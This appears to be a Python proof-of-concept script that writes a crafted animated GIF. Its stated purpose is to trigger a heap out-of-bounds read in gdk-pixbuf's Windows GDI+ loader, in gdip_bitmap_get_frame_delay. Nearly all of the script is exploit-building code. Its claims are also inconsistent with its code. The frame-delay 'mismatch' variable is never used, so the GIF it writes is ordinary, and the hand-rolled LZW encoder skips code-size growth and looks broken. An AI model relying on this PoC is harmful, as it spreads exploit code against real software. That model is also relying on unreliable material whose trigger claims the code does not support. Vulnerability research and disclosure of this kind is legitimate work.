#!/usr/bin/env python3
"""
PoC generator for VULN 001:
Heap Out-of-Bounds Read via Inflated item_count in gdip_bitmap_get_frame_delay

This script generates a crafted animated GIF with 5 frames but only 2 FrameDelay
entries. On a Windows system with GDI+ support in gdk-pixbuf, loading this GIF
would trigger an out-of-bounds read in gdip_bitmap_get_frame_delay() because the
item_count calculation includes PropertyItem header overhead, making the bounds
check too permissive when accessing frame delay entries for frames 3, 4, and 5.

NOTE: This vulnerability cannot be triggered on Linux because GDI+ is Windows-only.
"""

import struct
import os

OUTPUT_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "vuln_001.gif")

# Number of frames in the GIF (more than the FrameDelay entries available)
NUM_FRAMES = 5
# Only 2 FrameDelay entries will be present in GDI+ property data (simulated mismatch)
NUM_DELAY_ENTRIES = 2

WIDTH = 10
HEIGHT = 10


def make_color_table(num_colors=4):
    """Generate a minimal global color table."""
    colors = [
        b'\x00\x00\x00',  # black
        b'\xff\x00\x00',  # red
        b'\x00\xff\x00',  # green
        b'\x00\x00\xff',  # blue
    ]
    table = b''
    for i in range(num_colors):
        table += colors[i % len(colors)]
    return table


def make_logical_screen_descriptor(width, height, has_gct=True, gct_size_exp=1):
    """
    Logical Screen Descriptor (7 bytes):
      width (2), height (2), packed byte, bgcolor index (1), aspect ratio (1)
    packed byte: Global Color Table Flag | Color Resolution | Sort Flag | GCT Size
    gct_size_exp=1 means 2^(1+1) = 4 colors
    """
    packed = 0x00
    if has_gct:
        packed |= 0x80          # Global Color Table Flag
        packed |= 0x10          # Color Resolution = 2 bits (value 1, stored as 1)
        packed |= (gct_size_exp & 0x07)  # GCT size field
    bgcolor = 0
    aspect = 0
    return struct.pack('<HHBBb', width, height, packed, bgcolor, aspect)


def make_netscape_extension(loop_count=0):
    """Netscape Application Extension for looping (loop_count=0 means infinite)."""
    data = b'\x21\xFF'         # Extension Introducer + Application Extension Label
    data += b'\x0B'            # Block size = 11
    data += b'NETSCAPE2.0'     # Application ID + Auth Code (11 bytes)
    data += b'\x03'            # Sub-block size = 3
    data += b'\x01'            # Sub-block ID
    data += struct.pack('<H', loop_count)  # Loop count
    data += b'\x00'            # Block terminator
    return data


def make_graphics_control_extension(delay_centiseconds=10):
    """
    Graphics Control Extension (8 bytes total including markers):
      21 F9 04 [packed] [delay_lo] [delay_hi] [transparent_index] 00
    delay is in centiseconds (1/100 s)
    """
    packed = 0x00  # Reserved=0, Disposal=0, User Input=0, Transparent=0
    transparent_index = 0
    data = b'\x21\xF9'                # Extension Introducer + Graphic Control Label
    data += b'\x04'                   # Block size = 4
    data += struct.pack('B', packed)
    data += struct.pack('<H', delay_centiseconds)
    data += struct.pack('B', transparent_index)
    data += b'\x00'                   # Block terminator
    return data


def make_image_descriptor(left=0, top=0, width=10, height=10, has_lct=False):
    """
    Image Descriptor (10 bytes):
      2C [left] [top] [width] [height] [packed]
    """
    packed = 0x00
    if has_lct:
        packed |= 0x80
    data = b'\x2C'
    data += struct.pack('<HHHHB', left, top, width, height, packed)
    return data


def make_image_data(width, height, lzw_min_code_size=2):
    """
    Minimal LZW-compressed image data. Use a simple approach:
    fill with color index 0 and use a basic LZW encoding.
    For simplicity, we use a pre-encoded block for a 10x10 all-zero image.
    """
    # LZW minimum code size
    data = struct.pack('B', lzw_min_code_size)

    # Pixel count
    pixel_count = width * height

    # Use a very minimal LZW encoding with lzw_min_code_size=2
    # Clear code = 4, EOI code = 5
    # For simplicity, encode using raw bytes that represent a valid LZW stream
    # We'll use the approach of emitting clear code, then all zeros, then EOI

    # Pre-built LZW stream for 100 pixels all color-index 0, lzw_min=2
    # This is a hand-crafted valid LZW stream:
    # Clear(4), 0,0,0,...(100 times), EOI(5)
    # Encoded with code_size starting at 3 bits
    # For robustness, just write a simple repeating pattern sub-block

    # Simple approach: write raw pixel values packed into LZW codes
    # LZW minimum code size 2 -> initial code size 3 bits
    # Clear code = 0b100 = 4, EOI = 0b101 = 5
    # Color codes: 0=0b000, 1=0b001, 2=0b010, 3=0b011

    # Build a minimal but valid LZW bit stream
    bits = []

    def emit_code(code, size):
        for _ in range(size):
            bits.append(code & 1)
            code >>= 1

    code_size = lzw_min_code_size + 1  # 3 bits
    clear_code = 1 << lzw_min_code_size  # 4
    eoi_code = clear_code + 1            # 5

    emit_code(clear_code, code_size)
    for _ in range(pixel_count):
        emit_code(0, code_size)
    emit_code(eoi_code, code_size)

    # Pack bits into bytes (LSB first)
    stream = bytearray()
    for i in range(0, len(bits), 8):
        byte = 0
        for j in range(8):
            if i + j < len(bits):
                byte |= bits[i + j] << j
        stream.append(byte)

    # Split into sub-blocks of max 255 bytes
    stream = bytes(stream)
    sub_blocks = b''
    offset = 0
    while offset < len(stream):
        chunk = stream[offset:offset + 255]
        sub_blocks += struct.pack('B', len(chunk)) + chunk
        offset += 255
    sub_blocks += b'\x00'  # Block terminator

    data += sub_blocks
    return data


def build_gif():
    """
    Build a crafted animated GIF with NUM_FRAMES frames.
    The mismatch between NUM_FRAMES (5) and NUM_DELAY_ENTRIES (2) is the trigger:
    on a GDI+ system, GetPropertyItem(PropertyTagFrameDelay) would return an array
    with only 2 entries, but the inflated item_count allows reading up to ~6-8 slots,
    and the loop iterates i=0..4, causing OOB read at indices 2, 3, 4.
    """
    gif = b''

    # Header
    gif += b'GIF89a'

    # Logical Screen Descriptor
    # GCT size exponent=1 -> 2^(1+1)=4 colors
    gif += make_logical_screen_descriptor(WIDTH, HEIGHT, has_gct=True, gct_size_exp=1)

    # Global Color Table (4 colors * 3 bytes = 12 bytes)
    gif += make_color_table(4)

    # Netscape loop extension
    gif += make_netscape_extension(loop_count=0)

    # Add NUM_FRAMES frames; each frame has a Graphics Control Extension + image data
    for i in range(NUM_FRAMES):
        # Delay varies per frame to make it look like a real animation
        delay = (i + 1) * 10  # centiseconds: 10, 20, 30, 40, 50
        gif += make_graphics_control_extension(delay_centiseconds=delay)
        gif += make_image_descriptor(left=0, top=0, width=WIDTH, height=HEIGHT)
        gif += make_image_data(WIDTH, HEIGHT)

    # GIF Trailer
    gif += b'\x3B'

    return gif


def main():
    gif_data = build_gif()
    with open(OUTPUT_FILE, 'wb') as f:
        f.write(gif_data)
    print(f"[+] Generated crafted animated GIF: {OUTPUT_FILE}")
    print(f"    Frames: {NUM_FRAMES}, FrameDelay entries that GDI+ would see: {NUM_DELAY_ENTRIES}")
    print(f"    File size: {len(gif_data)} bytes")
    print(f"    Trigger: gdip_bitmap_get_frame_delay() OOB read at frame indices 2..{NUM_FRAMES-1}")


if __name__ == '__main__':
    main()
